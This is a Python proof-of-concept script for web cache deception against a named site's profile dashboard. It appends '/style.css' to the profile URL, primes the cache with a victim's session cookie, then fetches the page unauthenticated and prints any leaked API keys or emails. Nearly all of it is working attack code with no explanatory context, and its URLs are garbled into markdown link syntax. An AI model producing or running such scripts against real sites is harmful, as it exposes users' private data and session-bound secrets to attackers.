import requests

# Target configuration
TARGET_BASE = "[https://zerothehero.com/dashboard/profile](https://zerothehero.com/dashboard/profile)"
PAYLOAD_PATH = "/style.css"
FULL_TARGET = f"{TARGET_BASE}{PAYLOAD_PATH}"

# Session setup
VICTIM_COOKIES = {"session": "VICTIM_SESSION_TOKEN_HERE"}
PROXIES = {"http": "[http://127.0.0.1:8080](http://127.0.0.1:8080)", "https": "[http://127.0.0.1:8080](http://127.0.0.1:8080)"}

def verify_wcd():
    print(f"[*] Testing target: {FULL_TARGET}")
    
    # Step 1: Prime the cache as the victim
    res_victim = requests.get(FULL_TARGET, cookies=VICTIM_COOKIES, proxies=PROXIES, verify=False)
    cache_header_1 = res_victim.headers.get("X-Cache", res_victim.headers.get("CF-Cache-Status", "N/A"))
    print(f"[+] Request 1 (Victim) Status: {res_victim.status_code} | Cache Header: {cache_header_1}")
    
    # Step 2: Fetch as an unauthenticated attacker
    res_attacker = requests.get(FULL_TARGET, proxies=PROXIES, verify=False)
    cache_header_2 = res_attacker.headers.get("X-Cache", res_attacker.headers.get("CF-Cache-Status", "N/A"))
    print(f"[+] Request 2 (Attacker) Status: {res_attacker.status_code} | Cache Header: {cache_header_2}")
    
    # Step 3: Validate vulnerability conditions
    if res_attacker.status_code == 200 and "HIT" in cache_header_2.upper():
        if "API-KEY" in res_attacker.text or "email" in res_attacker.text:
            print("\n[!!!] CRITICAL: Web Cache Deception Vulnerability Confirmed!")
            print(f"[+] Leaked Payload Excerpt: {res_attacker.text[:200]}")
            return
    print("\n[-] Target not vulnerable or cache rules prevented storage.")

if __name__ == "__main__":
    verify_wcd()
